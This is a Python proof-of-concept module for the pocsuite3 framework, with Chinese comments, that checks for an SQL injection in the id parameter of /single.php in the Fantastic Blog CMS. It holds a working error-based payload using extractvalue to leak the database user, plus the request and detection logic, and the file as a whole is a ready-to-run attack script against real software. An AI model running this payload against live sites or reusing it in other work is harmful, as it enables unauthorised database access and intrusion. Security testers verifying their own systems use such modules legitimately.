import requests
from pocsuite3.api import POCBase, Output, register_poc, requests
from pocsuite3.api import POC_CATEGORY, VUL_TYPE, REVERSE_PAYLOAD

class TestPOC(POCBase):
    vulID = 'N/A'  # 漏洞编号
    version = '1.0'  # 漏洞版本
    author = ['redfaith']  # 编写POC者
    vulDate = 'N/A'  # 漏洞公开的时间
    createDate = '2022-07-05'  # 编写POC的时间
    updateDate = '2022-07-05'  # POC更新的时间，一般和漏洞公开时间一致
    references = ['N/A']  # 参考链接地址
    name = 'Fantastic Blog (CMS) SQL注入漏洞'  # POC名称
    appPowerLink = 'https://github.com/mrshu/Fantastic-Blog'  # 漏洞厂商主页地址
    appName = 'Fantastic Blog'  # 漏洞应用名称
    appVersion = 'N/A'  # 漏洞影响版本号
    vulType = VUL_TYPE.SQL_INJECTION  # 漏洞类型：SQL注入
    category = POC_CATEGORY.EXPLOITS.REMOTE  # 漏洞攻击类型：远程攻击
    desc = '''
        Fantastic Blog (CMS)是一个绝对出色的博客/文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。该CMS的/single.php路径下，id参数存在一个SQL注入漏洞。
    '''  # 漏洞简要描述
    pocDesc = '''
        Fantastic Blog (CMS)的/single.php路径下，id参数存在一个SQL注入漏洞。攻击者可以通过构造恶意请求向id参数中注入SQL语句，最终导致服务器被攻击者完全控制。
    '''  # POC简要描述

    def _verify(self):
        result = {}
        # 定义请求的URL地址
        url = self.url + '/single.php'
        # 定义SQL注入的Payload
        payload = "1' and extractvalue(1,concat(0x5c,(select user()),0x5c));#"
        try:
            # 发送GET请求并获取响应内容
            response = requests.get(url, params={'id': payload})
            # 如果返回结果包含指定的关键字，则说明漏洞存在
            if response.status_code == 200 and 'XPATH syntax error' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            pass
        return self._parse_output(result)

    def _parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("Not vulnerable")
        return output

register_poc(TestPOC)